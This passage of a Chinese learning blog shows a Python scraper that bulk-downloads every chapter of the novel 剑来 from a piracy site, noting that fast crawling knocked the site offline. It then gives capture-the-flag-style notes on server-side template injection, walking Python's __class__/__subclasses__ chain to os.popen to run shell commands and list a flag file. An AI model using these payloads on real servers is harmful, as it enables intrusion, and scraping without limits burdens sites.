class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> =<span class="string">&quot;/38_38964/52349174.html&quot;</span>&gt;</span>第一千一百三十章 有个不用回答的问题<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> =<span class="string">&quot;/38_38964/52415193.html&quot;</span>&gt;</span>第一千一百二十九章 今宵明月<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">dt</span>&gt;</span>《剑来》正文卷<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> =<span class="string">&quot;/38_38964/38859339.html&quot;</span>&gt;</span>第一章 惊蛰<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> =<span class="string">&quot;/38_38964/38850178.html&quot;</span>&gt;</span>第二章 开门<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> =<span class="string">&quot;/38_38964/38844368.html&quot;</span>&gt;</span>第三章 日出<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> =<span class="string">&quot;/38_38964/38836882.html&quot;</span>&gt;</span>第四章 黄鸟<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> =<span class="string">&quot;/38_38964/38828993.html&quot;</span>&gt;</span>第五章 道破<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> =<span class="string">&quot;/38_38964/38807567.html&quot;</span>&gt;</span>第六章 下签<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> =<span class="string">&quot;/38_38964/38799247.html&quot;</span>&gt;</span>第七章 碗水<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">                                ......<span class="comment">&lt;!--此处省略 --&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> =<span class="string">&quot;/38_38964/52108078.html&quot;</span>&gt;</span>第一千一百三十五章 再见陈平安<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> =<span class="string">&quot;/38_38964/52076294.html&quot;</span>&gt;</span>第一千一百三十六章 人各梦魂中<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> =<span class="string">&quot;/38_38964/52014535.html&quot;</span>&gt;</span>第一千一百三十七章 如书如句读<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> =<span class="string">&quot;/38_38964/52004020.html&quot;</span>&gt;</span>第一千一百三十八章 蜉蝣见青天<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> =<span class="string">&quot;/38_38964/51951192.html&quot;</span>&gt;</span>第一千一百三十九章 故事是一把双刃剑<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> =<span class="string">&quot;/38_38964/51894719.html&quot;</span>&gt;</span>第一千一百四十章 这天公<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后用 <strong>lxml</strong> 读取我们需要的信息</p>
<p>在浏览器f12中右键一个元素可以查看它的x地址</p>
<p>先看看第一章的request</p>
<figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">GET <span class="operator">/</span><span class="number">38</span>_38964<span class="operator">/</span><span class="number">38859339.</span>html HTTP<span class="operator">/</span><span class="number">2</span></span><br><span class="line">Host<span class="operator">:</span> www.biqukan8.cc</span><br><span class="line">Cookie<span class="operator">:</span> __tins__21819133<span class="operator">=</span><span class="operator">%7B%</span><span class="number">22</span>sid<span class="operator">%22%</span><span class="number">3</span>A<span class="operator">%201701961220502%</span><span class="number">2</span>C<span class="operator">%20%</span><span class="number">22</span>vd<span class="operator">%22%</span><span class="number">3</span>A<span class="operator">%201%</span><span class="number">2</span>C<span class="operator">%20%</span><span class="number">22</span>expires<span class="operator">%22%</span><span class="number">3</span>A<span class="operator">%201701963020502%</span><span class="number">7</span>D; __51cke__<span class="operator">=</span>; __51laig__<span class="operator">=</span><span class="number">1</span></span><br><span class="line">Sec<span class="operator">-</span>Ch<span class="operator">-</span>Ua<span class="operator">:</span> <span class="string">&quot;Chromium&quot;</span>;v<span class="operator">=</span><span class="string">&quot;119&quot;</span><span class="punctuation">,</span> <span class="string">&quot;Not?A_Brand&quot;</span>;v<span class="operator">=</span><span class="string">&quot;24&quot;</span></span><br><span class="line">Sec<span class="operator">-</span>Ch<span class="operator">-</span>Ua<span class="operator">-</span>Mobile<span class="operator">:</span> <span class="operator">?</span><span class="number">0</span></span><br><span class="line">Sec<span class="operator">-</span>Ch<span class="operator">-</span>Ua<span class="operator">-</span>Platform<span class="operator">:</span> <span class="string">&quot;Linux&quot;</span></span><br><span class="line">Upgrade<span class="operator">-</span>Insecure<span class="operator">-</span>Requests<span class="operator">:</span> <span class="number">1</span></span><br><span class="line">User<span class="operator">-</span>Agent<span class="operator">:</span> Mozilla<span class="operator">/</span><span class="number">5.0</span> <span class="punctuation">(</span>Windows NT <span class="number">10.0</span>; Win64; x64<span class="punctuation">)</span> AppleWebKit<span class="operator">/</span><span class="number">537.36</span> <span class="punctuation">(</span>KHTML<span class="punctuation">,</span> like Gecko<span class="punctuation">)</span> Chrome<span class="operator">/</span><span class="number">119.0</span>.6045.123 Safari<span class="operator">/</span><span class="number">537.36</span></span><br><span class="line">Accept<span class="operator">:</span> text<span class="operator">/</span>html<span class="punctuation">,</span>application<span class="operator">/</span>xhtml<span class="operator">+</span>xml<span class="punctuation">,</span>application<span class="operator">/</span>xml;q<span class="operator">=</span><span class="number">0.9</span><span class="punctuation">,</span>image<span class="operator">/</span>avif<span class="punctuation">,</span>image<span class="operator">/</span>webp<span class="punctuation">,</span>image<span class="operator">/</span>apng<span class="punctuation">,</span><span class="operator">*</span><span class="operator">/</span><span class="operator">*</span>;q<span class="operator">=</span><span class="number">0.8</span><span class="punctuation">,</span>application<span class="operator">/</span>signed<span class="operator">-</span>exchange;v<span class="operator">=</span>b3;q<span class="operator">=</span><span class="number">0.7</span></span><br><span class="line">Sec<span class="operator">-</span>Fetch<span class="operator">-</span>Site<span class="operator">:</span> same<span class="operator">-</span>origin</span><br><span class="line">Sec<span class="operator">-</span>Fetch<span class="operator">-</span>Mode<span class="operator">:</span> navigate</span><br><span class="line">Sec<span class="operator">-</span>Fetch<span class="operator">-</span>User<span class="operator">:</span> <span class="operator">?</span><span class="number">1</span></span><br><span class="line">Sec<span class="operator">-</span>Fetch<span class="operator">-</span>Dest<span class="operator">:</span> document</span><br><span class="line">Referer<span class="operator">:</span> https<span class="operator">:</span><span class="operator">/</span><span class="operator">/</span>www.biqukan8.cc<span class="operator">/</span><span class="number">38</span>_38964<span class="operator">/</span><span class="number">20392684.</span>html</span><br><span class="line">Accept<span class="operator">-</span>Encoding<span class="operator">:</span> gzip<span class="punctuation">,</span> deflate<span class="punctuation">,</span> br</span><br><span class="line">Accept<span class="operator">-</span>Language<span class="operator">:</span> en<span class="operator">-</span>US<span class="punctuation">,</span>en;q<span class="operator">=</span><span class="number">0.9</span></span><br><span class="line">Priority<span class="operator">:</span> u<span class="operator">=</span><span class="number">0</span><span class="punctuation">,</span> i</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>很明显, 只需修改get后面的地址</p>
<p>我们要获取每一个章节名和地址</p>
<p>先拿第一章试试</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;__51cke__=; bcolor=; font=; size=; fontcolor=; width=; __tins__21819133=%7B%22sid%22%3A%201701961220502%2C%20%22vd%22%3A%203%2C%20%22expires%22%3A%201701963144795%7D; __51laig__=3&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;www.biqukan8.cc&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main_url = <span class="string">&quot;https://www.biqukan8.cc/38_38964/20392684.html&quot;</span></span><br><span class="line"></span><br><span class="line">main_resp = requests.get(main_url, headers=headers)</span><br><span class="line"></span><br><span class="line">main_text = main_resp.text</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(main_text)                        # 以上是不变的</span></span><br><span class="line"></span><br><span class="line">main_html = etree.HTML(main_text)</span><br><span class="line"></span><br><span class="line">url = main_html.xpath(<span class="string">&quot;/html/body/div[4]/dl/dd[13]/a/@href&quot;</span>)[<span class="number">0</span>]                 <span class="comment">#得到一个数组, 取第一个值</span></span><br><span class="line">title = main_html.xpath(<span class="string">&quot;/html/body/div[4]/dl/dd[13]/a/text()&quot;</span>)[<span class="number">0</span>]              </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(url)</span><br><span class="line"><span class="built_in">print</span>(title)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/38_38964/38859339.html</span><br><span class="line">第一章 惊蛰</span><br></pre></td></tr></table></figure>

<p>读取全部目录及地址</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;__51cke__=; bcolor=; font=; size=; fontcolor=; width=; __tins__21819133=%7B%22sid%22%3A%201701961220502%2C%20%22vd%22%3A%203%2C%20%22expires%22%3A%201701963144795%7D; __51laig__=3&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;www.biqukan8.cc&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main_url = <span class="string">&quot;https://www.biqukan8.cc/38_38964/20392684.html&quot;</span></span><br><span class="line"></span><br><span class="line">main_resp = requests.get(main_url, headers=headers)</span><br><span class="line"></span><br><span class="line">main_text = main_resp.text</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(main_text)                        # 以上是不变的</span></span><br><span class="line"></span><br><span class="line">main_html = etree.HTML(main_text)</span><br><span class="line"></span><br><span class="line">url=[]</span><br><span class="line">title=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>, <span class="number">1160</span>):</span><br><span class="line">    url.append(main_html.xpath(<span class="string">&#x27;/html/body/div[4]/dl/dd[&#123;&#125;]/a/@href&#x27;</span>.<span class="built_in">format</span>(i))[<span class="number">0</span>])</span><br><span class="line">    title.append(main_html.xpath(<span class="string">&quot;/html/body/div[4]/dl/dd[&#123;&#125;]/a/text()&quot;</span>.<span class="built_in">format</span>(i))[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(url)</span><br><span class="line"><span class="built_in">print</span>(title)</span><br></pre></td></tr></table></figure>



<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;__51cke__=; bcolor=; font=; size=; fontcolor=; width=; __tins__21819133=%7B%22sid%22%3A%201701961220502%2C%20%22vd%22%3A%203%2C%20%22expires%22%3A%201701963144795%7D; __51laig__=3&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;www.biqukan8.cc&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main_url = <span class="string">&quot;https://www.biqukan8.cc/38_38964/20392684.html&quot;</span></span><br><span class="line"></span><br><span class="line">main_resp = requests.get(main_url, headers=headers)</span><br><span class="line"></span><br><span class="line">main_text = main_resp.text</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(main_text)                        # 以上是不变的</span></span><br><span class="line"></span><br><span class="line">main_html = etree.HTML(main_text)</span><br><span class="line"></span><br><span class="line">url=[]</span><br><span class="line">title=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>, <span class="number">1160</span>):</span><br><span class="line">    url.append(main_html.xpath(<span class="string">&#x27;/html/body/div[4]/dl/dd[&#123;&#125;]/a/@href&#x27;</span>.<span class="built_in">format</span>(i))[<span class="number">0</span>])</span><br><span class="line">    title.append(main_html.xpath(<span class="string">&quot;/html/body/div[4]/dl/dd[&#123;&#125;]/a/text()&quot;</span>.<span class="built_in">format</span>(i))[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">orurl = <span class="string">&quot;https://www.biqukan8.cc&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1147</span>):</span><br><span class="line">    iresp = etree.HTML(requests.get(orurl+url[i], headers=headers).text)</span><br><span class="line">    cont = iresp.xpath(<span class="string">&#x27;//*[@id=&quot;content&quot;]/text()&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    s = <span class="string">&quot;\n&quot;</span>+title[i]+<span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> para <span class="keyword">in</span> cont:</span><br><span class="line">        s=s+para+<span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;finish&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">    s=s+<span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;剑来.txt&quot;</span>,<span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f:                     <span class="comment"># python的文件操作</span></span><br><span class="line">        f.write(s)</span><br><span class="line">  </span><br></pre></td></tr></table></figure>
<p>好吧, 爬了10章网站就上不去了</p>
<p>后面查了一下, 爬太快可能会把服务器爆掉</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time </span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>每个循环加一个timesleep</p>
<p>成功!!!</p>
<h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>SSTI就是 <strong>服务器端模板注入(Server-Side Template Injection)</strong></p>
<h3 id="class-bases-subclasses-chain"><a href="#class-bases-subclasses-chain" class="headerlink" title="class-bases-subclasses chain"></a>class-bases-subclasses chain</h3><ul>
<li><p>class<br>变量所属的类</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;tuple&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;&#125;.__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>bases<br>(类的基类,)</p>
</li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__bases__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;&#125;.__class__.__bases__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>返回的是一个tuple</p>
<p>加上[0]</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>mro<br>(类, 基类)</li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;&#125;.__class__.__mro__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br></pre></td></tr></table></figure>

<ul>
<li>subclasses()</li>
</ul>
<p>返回[子类a, 子类b, ……]</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;&#125;.__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">[&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;async_generator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytearray_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytes_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytes&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;builtin_function_or_method&#x27;</span>&gt;, ......&lt;<span class="keyword">class</span> <span class="string">&#x27;inspect._void&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;inspect._empty&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;inspect.Parameter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;inspect.BoundArguments&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;inspect.Signature&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;rlcompleter.Completer&#x27;</span>&gt;]</span><br></pre></td></tr></table></figure>

<p>常用的子类</p>
<p>每一个python的好像不一样, 我的是140</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">140</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;os._wrap_close&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>init</li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">140</span>].__init__</span><br><span class="line">&lt;function _wrap_close.__init__ at <span class="number">0x7f065040aca0</span>&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>globals</li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">140</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls /&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;bin\nboot\ndev\netc\nflag\nhome\ninitrd.img\ninitrd.img.old\nlib\nlib32\nlib64\nlost+found\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsnap\nsrv\nsys\ntmp\nusr\nvar\nvmlinuz\nvmlinuz.old\nwww\nwww_11903\nwww_30765\nwww_9050\n&#x27;</span></span><br></pre></td></tr></table></figure>

<p>转行符没有编码</p>
<h3 id="import"><a href="#import" class="headerlink" title="import"></a>import</h3><ul>
<li>import</li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls /&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;bin\nboot\ndev\netc\nflag\nhome\ninitrd.img\ninitrd.img.old\nlib\nlib32\nlib64\nlost+found\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsnap\nsrv\nsys\ntmp\nusr\nvar\nvmlinuz\nvmlinuz.old\nwww\nwww_11903\nwww_30765\nwww_9050\n&#x27;</span></span><br></pre></td></tr></table></figure>

